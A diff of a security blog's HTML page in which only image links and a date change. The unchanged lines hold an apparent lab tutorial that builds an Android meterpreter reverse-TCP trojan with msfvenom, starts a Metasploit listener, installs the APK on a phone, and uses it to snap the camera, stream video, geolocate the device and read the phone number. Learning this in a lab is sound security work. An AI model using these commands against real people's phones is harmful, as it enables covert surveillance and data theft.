@@ -480,7 +480,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20210509122542428.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20210509122542428.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -637,7 +637,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-05-09
+                    2022-04-16
                 </div>
                 
 
@@ -673,11 +673,11 @@
             <div id="articleContent">
                 <h2 id="Ax-Preparation"><a href="#Ax-Preparation" class="headerlink" title="Ax Preparation"></a>Ax Preparation</h2><p>Formost,prepare kali and mobilephone for android.</p>
 <p>Afterwards,let’s they by one LAN.</p>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20210509142140640.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20210509142140640.png"></p>
 <h2 id="Bx-Generate-APK-Trojan"><a href="#Bx-Generate-APK-Trojan" class="headerlink" title="Bx Generate APK Trojan"></a>Bx Generate APK Trojan</h2><p>use <code>ifconfig</code> command display your kali ip address</p>
 <pre class=" language-sh"><code class="language-sh">msfvenom -p android/meterpreter/reverse_tcp lhost=[your kali ip]  lport=6666 R>/home/Msf.apk
 </code></pre>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20210509104436291.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20210509104436291.png"></p>
 <h2 id="Cx-MSF-listening"><a href="#Cx-MSF-listening" class="headerlink" title="Cx MSF listening"></a>Cx MSF listening</h2><p>use <code>msfconsole</code> command open metersploit framwork.</p>
 <pre class=" language-sh"><code class="language-sh">use exploit/multi/handler
 set payload android/meterpreter/reverse_tcp
@@ -686,21 +686,21 @@ set LPORT 6666
 show options         # check configuration
 exploit
 </code></pre>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20210509104045557.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20210509104045557.png"></p>
 <p>start listening</p>
 <h2 id="Dx-Trojan-installation-on-mobilephone"><a href="#Dx-Trojan-installation-on-mobilephone" class="headerlink" title="Dx Trojan installation on mobilephone"></a>Dx Trojan installation on mobilephone</h2><ul>
 <li><p>Put the MSF.apk application into the phone to install</p>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20210509105600863.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20210509105600863.png"></p>
 </li>
 <li><p>Trust the installation</p>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20210509105743462.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20210509105743462.png"></p>
 </li>
 <li><p>Click application</p>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20210509110234070.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20210509110234070.png"></p>
 </li>
 </ul>
 <p>MSF online successfully</p>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20210509104735705.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20210509104735705.png"></p>
 <h2 id="Ex-Steal-information"><a href="#Ex-Steal-information" class="headerlink" title="Ex Steal information"></a>Ex Steal information</h2><h3 id="1-camera"><a href="#1-camera" class="headerlink" title="1. camera"></a>1. camera</h3><p><code>webcam_list</code> list camera device</p>
 <pre class=" language-text"><code class="language-text">webcam_list      // list camera
 webcam_snap 1/2
@@ -708,22 +708,22 @@ webcam_chat      // vedio chat
 webcam_snap      // snapshoot
 webcam_stream -i 1      // select camera require video stream
 </code></pre>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20210509111046931.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20210509111046931.png"></p>
 <p><code>webcam_snap -i 1</code> select number one take a phone</p>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20210509111704223.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20210509111704223.png"></p>
 <p><code>webcam_stream -i 2 -q 10</code> </p>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20210509122542428.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20210509122542428.png"></p>
 <h3 id="2-wakelock"><a href="#2-wakelock" class="headerlink" title="2.wakelock"></a>2.wakelock</h3><p>maintain open status</p>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20210509112255949.png"></p>
-<h3 id="3-network-information"><a href="#3-network-information" class="headerlink" title="3.network information"></a>3.network information</h3><p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20210509112237514.png"></p>
-<h3 id="4-Session-management"><a href="#4-Session-management" class="headerlink" title="4.Session management"></a>4.Session management</h3><p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20210509112748251.png"></p>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20210509112825916.png"></p>
-<h3 id="5-show-phone-number"><a href="#5-show-phone-number" class="headerlink" title="5.show phone number"></a>5.show phone number</h3><p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20210509114135178.png"></p>
-<h3 id="6-system-information"><a href="#6-system-information" class="headerlink" title="6.system information"></a>6.system information</h3><p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20210509114723321.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20210509112255949.png"></p>
+<h3 id="3-network-information"><a href="#3-network-information" class="headerlink" title="3.network information"></a>3.network information</h3><p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20210509112237514.png"></p>
+<h3 id="4-Session-management"><a href="#4-Session-management" class="headerlink" title="4.Session management"></a>4.Session management</h3><p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20210509112748251.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20210509112825916.png"></p>
+<h3 id="5-show-phone-number"><a href="#5-show-phone-number" class="headerlink" title="5.show phone number"></a>5.show phone number</h3><p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20210509114135178.png"></p>
+<h3 id="6-system-information"><a href="#6-system-information" class="headerlink" title="6.system information"></a>6.system information</h3><p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20210509114723321.png"></p>
 <h3 id="7-locate-information"><a href="#7-locate-information" class="headerlink" title="7.locate information"></a>7.locate information</h3><pre class=" language-sh"><code class="language-sh">wlan_geolocate       // Use Wlan require
 geolocate            // Use GPS require LAT
 </code></pre>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20210509120549870.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20210509120549870.png"></p>
 <h2 id="Fx-More-Commands"><a href="#Fx-More-Commands" class="headerlink" title="Fx More Commands"></a>Fx More Commands</h2><pre class=" language-sh"><code class="language-sh">Core Commands
 =============
 
@@ -1187,7 +1187,7 @@ Application Controller Commands
                 <a href="/posts/8aec.html">
                     <div class="card-image">
                         
-                        <img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20210531012104973.png" class="responsive-img" alt="Docker-vulscan">
+                        <img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20210531012104973.png" class="responsive-img" alt="Docker-vulscan">
                         
                         <span class="card-title">Docker-vulscan</span>
                     </div>
@@ -1507,7 +1507,7 @@ Application Controller Commands
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">220.9k</span>&nbsp;字
+                class="white-color">221k</span>&nbsp;字
             
             
             
